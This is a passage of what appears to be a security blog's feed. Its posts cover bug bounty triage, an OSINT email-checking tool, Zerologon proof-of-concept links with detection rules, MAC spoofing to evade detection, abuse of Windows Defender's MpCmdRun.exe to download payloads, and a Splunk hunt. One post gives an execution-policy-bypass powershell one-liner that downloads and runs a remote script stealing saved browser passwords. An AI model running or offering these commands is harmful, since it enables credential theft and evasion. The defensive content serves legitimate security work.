&lt;p&gt;If any bug bounty incident is becomes a data breach incident, this team should have a visibility. Once it’s confirmed, they will take necessary actions based on the data privacy laws.(GDPR regulations etc.)&lt;/p&gt;

&lt;h3 id=&quot;types-of-bug-bounty-submissionsincidents&quot;&gt;Types of Bug Bounty Submissions/Incidents:&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Critical Vulnerabilities/Exploits (CVEs old version apps/softwares/packages etc.)&lt;/li&gt;
  &lt;li&gt;Web Application Vulnerabilities (OWASP Top 10, Authorization/ Logical flaws, Domain/Account takeover, OTP bypass, Injection attacks, XSS etc.)&lt;/li&gt;
  &lt;li&gt;Application Vulnerabilities (Buffer overflows, RCE, Reversing Exploits etc)&lt;/li&gt;
  &lt;li&gt;3rd party apps (Other vendor app vulnerabilities)&lt;/li&gt;
  &lt;li&gt;Confidential Data Disclosure (Exposed Databases/Cloud Instances, Source code disclosure, Default credentials, Weak passwords, Misconfigurations (Cloud/Servers/Apps), Enumeration, Cryptographic)&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;bug-bounty-triage---workflow&quot;&gt;Bug Bounty Triage - Workflow:&lt;/h4&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_site/blueteam-bugbounty-triage-organization/bbwrkflow.png&quot; alt=&quot;Bug Bounty Workflow&quot; /&gt;
&lt;figcaption&gt; BlueTeam - Bug Bounty Workflow &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h5 id=&quot;bug-bounty-triage---steps&quot;&gt;Bug Bounty Triage - Steps:&lt;/h5&gt;

&lt;ol&gt;
  &lt;li&gt;Bug bounty portal will send alerts to security team when researcher’s submitting their bugs/vulnerabilities.&lt;/li&gt;
  &lt;li&gt;Security teams will understand the impact of the bug bounty submission and prioritise accordingly (P1/P2/P3). They will create an incident in Ticketing systems for tracking purpose.&lt;/li&gt;
  &lt;li&gt;Identify if submission related data leak/data breach incident. We have to inform the Legal/Public relation teams.&lt;/li&gt;
  &lt;li&gt;Legal/PR teams will assess the impact and take necessary actions based on data privacy regulations and laws. Prepare the final report and send the data breach notification to affected users/orgs.&lt;/li&gt;
  &lt;li&gt;If submitted bug related to vulnerability/exploit/source code disclosure security teams will inform the specific technical teams to get more information about the specific application hosted location/owner/IP address etc.&lt;/li&gt;
  &lt;li&gt;Local IT teams/Application/SysAdmin/DevOps/Dev/Cloud teams will communicate with their internal teams based on initial information provided by Security Teams about the Vulnerability/Bug information.&lt;/li&gt;
  &lt;li&gt;Once identified the application owner/Asset/dev team, they have to fix the vulnerability/bug in their end.&lt;/li&gt;
  &lt;li&gt;Replicate/Validate the same bug on specific application by AppSec team/bug bounty researcher. Once it’s fixed it will be communicate the same to Security teams (CSIRT/SOC).&lt;/li&gt;
  &lt;li&gt;If this bug is not fixed properly, again go back to developers team and again explain the same by AppSec team.&lt;/li&gt;
  &lt;li&gt;Once bug is fixed specific application owner/Local IT team will inform the security team.&lt;/li&gt;
  &lt;li&gt;Security team will do investigation based on the bug/vulnerability. Here is below things to check.
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(i).  Impact of the Vulnerability.
(ii). If specific bug is used to exposing any confidential data.
(iii).If this bug is already exposed by external threat actors or not.
(iv). Any data exfiltrated via those apps using specific vulnerability/bug.
(v).  Investigate affected vulnerable device/machine/application server. ( Forensic investigation)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Security (CSIRT/SOC) team will do investigate using SIEM logs on specific hits Server/DB/Application/affected devices.&lt;/li&gt;
  &lt;li&gt;Track the threat actors who were already exploited specific bug/vulnerability.&lt;/li&gt;
  &lt;li&gt;Prepare the final investigation report submitted to Management.&lt;/li&gt;
  &lt;li&gt;Close the incident in their Ticketing/SOAR systems once whole investigation completion.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;best-practices&quot;&gt;Best Practices&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;CSIRT/SOC/InfoSec teams should have good knowledge on Application Security and able to understand the bug submissions. Train your analysts in AppSec space and organise Internal CTFs.&lt;/li&gt;
  &lt;li&gt;AppSec &amp;amp; Dev teams should maintain good relations and give weekly sessions on AppSec space with Dev Teams.&lt;/li&gt;
  &lt;li&gt;Security teams always support sysadmin/devops/cloud teams while handling these type of incidents. Train them on best security &amp;amp; hardening techniques while configure apps/servers/etc.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="blueteam" /><category term="bugbounty" /><category term="triage" /><category term="workflow" /><category term="bugs" /><summary type="html">In these days bug bounty programs were popular and most of the organisations were enrolled to multiple bug bounty platforms or running their own vulnerability disclosure programs. While running these programs, most of the security researchers/hunters actively scanning/enumerating particular scope of company external infrastructure.</summary></entry><entry><title type="html">OSINT - Email validation using forget-password functionality (Python).</title><link href="http://localhost:4000/osint-email-validation-using-forgetpassword-function-using-python/" rel="alternate" type="text/html" title="OSINT - Email validation using forget-password functionality (Python)." /><published>2020-09-15T19:00:00+07:00</published><updated>2020-09-15T19:00:00+07:00</updated><id>http://localhost:4000/osint-email-validation-using-forgetpassword-function-using-python</id><content type="html" xml:base="http://localhost:4000/osint-email-validation-using-forgetpassword-function-using-python/">&lt;p&gt;These days most of OSINT guys were doing their investigations on humans/unknown emails data. Sometimes threat actor/attackers also do mistakes while creating accounts in multiple platforms. We have to take those mistakes as an advantage in our investigations, so most of the email addresses will be unknown in lot of Threat Intel investigations.&lt;/p&gt;

&lt;p&gt;In this post, I would like to share one of the interesting github project which can take email address as an input and checking in top websites using “forget password” functionality.&lt;/p&gt;

&lt;h4 id=&quot;github-project&quot;&gt;Github Project:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/megadose/holehe&quot;&gt;Github- Holehe Project - https://github.com/megadose/holehe&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&quot;prerequisites&quot;&gt;Prerequisites:&lt;/h5&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip3 &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;holehe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.51
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;installation&quot;&gt;Installation:&lt;/h5&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/megadose/holehe.git
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;holehe/
python3 setup.py &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;demo&quot;&gt;Demo:&lt;/h5&gt;
&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/osint-email-validation-using-forgetpassword-function-using-python/demo.gif&quot; alt=&quot;Powershell code&quot; /&gt;
&lt;figcaption&gt;Powershell command&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h5 id=&quot;import-as-python-module&quot;&gt;Import as Python module:&lt;/h5&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;holehe&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adobe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lastpass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/megadose/holehe-maltego&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="osint" /><category term="python" /><category term="email" /><category term="recon" /><category term="validation" /><summary type="html">These days most of OSINT guys were doing their investigations on humans/unknown emails data. Sometimes threat actor/attackers also do mistakes while creating accounts in multiple platforms. We have to take those mistakes as an advantage in our investigations, so most of the email addresses will be unknown in lot of Threat Intel investigations.</summary></entry><entry><title type="html">Extract stored passwords from browser using Powershell</title><link href="http://localhost:4000/extract-saved-browser-passwords-using-powershell/" rel="alternate" type="text/html" title="Extract stored passwords from browser using Powershell" /><published>2020-09-15T09:00:00+07:00</published><updated>2020-09-15T09:00:00+07:00</updated><id>http://localhost:4000/extract-saved-browser-passwords-using-powershell</id><content type="html" xml:base="http://localhost:4000/extract-saved-browser-passwords-using-powershell/">&lt;p&gt;In this article, I would like to share powershell code which is useful to extract saved password from Internet Explorer/Microsoft Edge browsers in Windows endpoint.&lt;/p&gt;

&lt;h4 id=&quot;powershell-command&quot;&gt;Powershell command:&lt;/h4&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-nop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2K75g15')&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;execution&quot;&gt;Execution:&lt;/h5&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/extract-saved-browser-passwords-using-powershell/credgrap.gif&quot; alt=&quot;Powershell code&quot; /&gt;
&lt;figcaption&gt;Powershell command&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/HanseSecure/credgrap_ie_edge&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/HanseSecure/credgrap_ie_edge/master/credgrap_ie_edge.ps1&quot;&gt;Powershell code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="browser" /><category term="savedpasswords" /><category term="data" /><category term="collection" /><category term="redteam" /><summary type="html">In this article, I would like to share powershell code which is useful to extract saved password from Internet Explorer/Microsoft Edge browsers in Windows endpoint.</summary></entry><entry><title type="html">Zerologon (CVE-2020-1472) &amp;lt;-&amp;gt; Red|Blue Teams</title><link href="http://localhost:4000/zerologon-domainadmin-netlogon-cryptography/" rel="alternate" type="text/html" title="Zerologon (CVE-2020-1472) &amp;lt;-&amp;gt; Red|Blue Teams" /><published>2020-09-14T11:00:00+07:00</published><updated>2020-09-14T11:00:00+07:00</updated><id>http://localhost:4000/zerologon-domainadmin-netlogon-cryptography</id><content type="html" xml:base="http://localhost:4000/zerologon-domainadmin-netlogon-cryptography/">&lt;p&gt;This vulnerability allowed threat actor to foothold on your enterprise network to become a domain admin with single click.&lt;/p&gt;

&lt;p&gt;The vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf.&lt;/p&gt;

&lt;h4 id=&quot;redteam---offensive-toolsscripts&quot;&gt;RedTeam - Offensive Tools/Scripts:&lt;/h4&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/zerologon-domainadmin-netlogon-cryptography/Exploit.png&quot; alt=&quot;&quot; /&gt;
&lt;figcaption&gt; Python Exploit - ZeroLogon (CVE-2020-1472) &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecuraBV/CVE-2020-1472&quot;&gt;ZeroLogon- POC Script-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472&quot;&gt;ZeroLogon- POC Script-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917&quot;&gt;ZeroLogon - Mimikatz&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/BC-SECURITY/Invoke-ZeroLogon&quot;&gt;Zerologon - Powershell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;blueteam---defense&quot;&gt;BlueTeam - Defense:&lt;/h4&gt;

&lt;p&gt;Windows Event Correlation:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Keep an eye our Event ID 4624 followed by a 4742.&lt;/li&gt;
  &lt;li&gt;Failed attempts look for Event ID 5805&lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/zerologon-domainadmin-netlogon-cryptography/zerologon_blueteam.png&quot; alt=&quot;&quot; /&gt;
&lt;figcaption&gt; Windows Events - ZeroLogon (CVE-2020-1472) &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;snort-rule&quot;&gt;Snort Rule&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert tcp any any -&amp;gt; &lt;span class=&quot;o&quot;&gt;[!&lt;/span&gt;&amp;lt;domaincontrollers to exclude here] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;49152:65535] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;Possible DCSync Detected&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; flow:to_server,established&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; flags:PA&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; content:&lt;span class=&quot;s2&quot;&gt;&quot;|00 03 10 00 00 00|&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; depth:8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; content:&lt;span class=&quot;s2&quot;&gt;&quot;|03 00|&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; distance:14&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; classtype:attempted-admin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sid:20166316&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;other-detections&quot;&gt;Other Detections:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Credential%20Access/remote_pwd_reset_rpc_mimikatz_postzerologon_target_DC.evtx&quot;&gt;EVTX- Simulation Logs by @sbousseaden &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://corelight.blog/2020/09/16/detecting-zerologon-cve-2020-1472-with-zeek/&quot;&gt;Detection - Zeek&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;reference-articlesposts&quot;&gt;Reference Articles/Posts:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://www.secura.com/blog/zero-logon&quot;&gt;ZeroLogon Article&lt;/a&gt;
&lt;a href=&quot;https://twitter.com/SBousseaden/status/1306631518618607623&quot;&gt;Twitter - @SBousseaden&lt;/a&gt;
&lt;a href=&quot;https://twitter.com/joshlemon/status/1306487256480460805&quot;&gt;Twitter - @joshlemon&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="exploit" /><category term="poc" /><category term="python" /><category term="github" /><summary type="html">This vulnerability allowed threat actor to foothold on your enterprise network to become a domain admin with single click.</summary></entry><entry><title type="html">RedTeam Tip - Change MAC address in endpoint</title><link href="http://localhost:4000/redteam-tip-change-mac-address/" rel="alternate" type="text/html" title="RedTeam Tip - Change MAC address in endpoint" /><published>2020-09-12T10:00:00+07:00</published><updated>2020-09-12T10:00:00+07:00</updated><id>http://localhost:4000/redteam-tip-change-mac-address</id><content type="html" xml:base="http://localhost:4000/redteam-tip-change-mac-address/">&lt;p&gt;In Most of the RedTeam/Pentest engagements, smart guys always change MAC address in compromise endpoints to bypass Security detection tools.&lt;/p&gt;

&lt;h5 id=&quot;change-mac-address---powershell-windows-os&quot;&gt;Change MAC Address - Powershell (Windows OS):&lt;/h5&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Set-NetAdapter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Network Interface&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MacAddress&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Random MAC Address&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#Set-NetAdapter -Name &quot;Ethernet 1&quot; -MacAddress &quot;00-10-18-57-1B-0D&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;change-mac-address---command-line-linuxmac-os&quot;&gt;Change MAC Address - Command line (Linux/Mac OS):&lt;/h5&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; ifconfig &amp;lt;interface&amp;gt; ether &amp;lt;Random MAC Address&amp;gt;
&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; ifconfig en0 ether 00:18:57:1B-0D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Santhosh Baswa</name></author><category term="redteam" /><category term="endpoint" /><category term="pentest" /><summary type="html">In Most of the RedTeam/Pentest engagements, smart guys always change MAC address in compromise endpoints to bypass Security detection tools.</summary></entry><entry><title type="html">Windows Defender official backdoor - Download files from Internet using “MpCmdRun.exe”.</title><link href="http://localhost:4000/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/" rel="alternate" type="text/html" title="Windows Defender official backdoor - Download files from Internet using “MpCmdRun.exe”." /><published>2020-09-04T08:00:00+07:00</published><updated>2020-09-04T08:00:00+07:00</updated><id>http://localhost:4000/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun</id><content type="html" xml:base="http://localhost:4000/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/">&lt;p&gt;Recently I found interesting post in twitter, one of the security researcher(Askar) is identified, Microsoft Defender feature it can able to download any files from Internet.&lt;/p&gt;

&lt;p&gt;Microsoft Defender is having one of the executable(MpCmdRun.exe) which is used as Malware protection command line utility. This executable having a feature which can take any URL as an input and download files in specific Windows Defender system files path.&lt;/p&gt;

&lt;h5 id=&quot;windows-defender-file-path&quot;&gt;Windows Defender File Path:&lt;/h5&gt;
&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;C&lt;/span&gt;:\ProgramData\Microsoft\Windows &lt;span class=&quot;kd&quot;&gt;Defender&lt;/span&gt;\Platform\4.18.2007.8&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;\MpCmdRun.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;more-info-about-mpcmdrunexe-binary&quot;&gt;More Info about MpCmdRun.exe binary:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://strontic.github.io/xcyclopedia/library/MpCmdRun.exe-73E18D56F42B16160008629E1C936311.html&quot;&gt;Detailed Info - MpCmdRun.exe&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;windows-defender-command-line---mpcmdrunexe-download-any-payload&quot;&gt;Windows Defender Command Line - MpCmdRun.exe (Download any payload)&lt;/h4&gt;
&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;C&lt;/span&gt;:\ProgramData\Microsoft\Windows &lt;span class=&quot;kd&quot;&gt;Defender&lt;/span&gt;\platform\4.18.2008.9&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;\MpCmdRun.exe &lt;span class=&quot;na&quot;&gt;-url &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-path &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;-path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;quick--dirty---powershell-script---exploit-code&quot;&gt;Quick &amp;amp; Dirty - Powershell Script - Exploit Code:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://gist.github.com/klezVirus/977f6cd9e4126103326f6a28700382d1&quot;&gt;Abuse Windows Defender - MpCmdRun.exe - Powershell code&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;demo-by-using-cobaltstrike&quot;&gt;Demo by using CobaltStrike:&lt;/h4&gt;
&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/cbstrike.jpeg&quot; alt=&quot;Demo - CobaltStrike&quot; /&gt;
&lt;figcaption&gt;Demo - CobaltStrike&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;blueteam---threat-hunting--quick--dirty-detection&quot;&gt;BlueTeam - Threat Hunting / Quick &amp;amp; Dirty Detection:&lt;/h4&gt;
&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;Commandhistoryv2&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*Download*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*URL*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*url*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*download*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*http://*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*https://*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*HTTP://*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*HTTPS://*&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;dedup&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;CommandHistory&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;ComputerName&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;ApplicationName&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;CommandHistory&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;FileName&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;blueteam---splunk-detection&quot;&gt;BlueTeam - Splunk Detection:&lt;/h4&gt;
&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/splunk.png&quot; alt=&quot;Splunk hunting&quot; /&gt;
&lt;figcaption&gt;Splunk - Hunting&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://twitter.com/mohammadaskar2/status/1301263551638761477&quot;&gt;Twitter Post&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="windows" /><category term="backdoor" /><category term="download" /><category term="defender" /><summary type="html">Recently I found interesting post in twitter, one of the security researcher(Askar) is identified, Microsoft Defender feature it can able to download any files from Internet.</summary></entry><entry><title type="html">Redteam Tip - Google dork for .git folder exposure</title><link href="http://localhost:4000/devops-redteam-git-config-googledork/" rel="alternate" type="text/html" title="Redteam Tip - Google dork for .git folder exposure" /><published>2017-03-11T10:00:00+07:00</published><updated>2017-03-11T10:00:00+07:00</updated><id>http://localhost:4000/devops-redteam-git-config-googledork</id><content type="html" xml:base="http://localhost:4000/devops-redteam-git-config-googledork/">&lt;p&gt;As a part of OSINT/Recon activity to identify sensitive information for specific organisation/website most of the security engineers were using Google dorks. In this article we were identifying the vulnerable websites which exposes .git folders in their web servers.&lt;/p&gt;

&lt;h5 id=&quot;google-dork---git-folder-exposure&quot;&gt;Google Dork - .git folder exposure:&lt;/h5&gt;

&lt;figure&gt;
